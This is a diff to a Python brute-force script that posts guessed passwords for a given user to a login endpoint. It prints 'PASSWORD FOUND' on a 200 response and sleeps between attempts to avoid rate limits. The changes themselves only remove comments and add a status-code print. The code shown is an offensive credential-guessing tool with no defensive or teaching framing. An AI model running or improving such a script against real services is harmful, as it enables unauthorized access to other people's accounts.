@@ -1,6 +1,6 @@
 import requests
 import argparse
-import time  # For adding delay
+import time  
 
 def parse_arguments():
     parser = argparse.ArgumentParser(
@@ -51,15 +51,15 @@ def attack(user, password):
 
     try:
         response = requests.post(url, json=data, headers=headers, timeout=10)
-
+        print(f"CODE: {response.status_code}")   
         if response.status_code == 200:
             print(f"PASSWORD FOUND: {password}")
-            return True  # If password found, return True to stop further attempts
+            return True
     except requests.RequestException as e:
         print(f"Error during request: {e}")
-        return False  # In case of an error, just move to the next password
+        return False  
 
-    return False  # Return False if password not found
+    return False  
 
 if __name__ == '__main__':
     user, passwords = parse_arguments()
@@ -72,6 +72,6 @@ if __name__ == '__main__':
         if attack(user, password):
             break
 
-        time.sleep(2)  # Adding a 2-second delay between each request to avoid potential rate limits
+        time.sleep(2)  
 
     print("Attack finished.")
